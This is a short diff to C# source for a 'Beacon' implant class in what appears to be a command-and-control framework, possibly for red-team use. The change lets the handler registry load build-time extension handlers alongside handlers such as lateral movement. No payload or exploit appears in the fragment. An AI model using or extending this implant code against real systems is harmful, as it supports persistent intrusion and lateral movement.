@@ -74,8 +74,8 @@ internal sealed class Beacon
     /// <summary>
     /// Builds a Beacon whose lateral.move handler can derive a child using
     /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
-    /// derivation disabled. <paramref name="classVerbs"/> is the baked class
-    /// verb set; the advertised capability set derives from it (Sec 5.3).
+    /// derivation disabled. <paramref name="classVerbs"/> is the baked verb set;
+    /// the advertised capability set derives from it (Sec 5.3).
     /// </summary>
     public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
@@ -90,7 +90,12 @@ internal sealed class Beacon
         _sleep = sleep;
         _jitter = jitter;
         _killDate = killDate;
-        _handlers = HandlerRegistry.Default(enroll);
+        // The registry carries the reference set plus whatever out-of-tree
+        // handlers the build unit baked through ExtensionRegistrations (the
+        // extension kit's additional seam, extending/tradecraft.md): empty in
+        // the dev stub, generated per build when an extension directory is
+        // configured.
+        _handlers = HandlerRegistry.Default(enroll, ExtensionRegistrations.Handlers);
         _classVerbs = classVerbs;
         _log = log;
     }
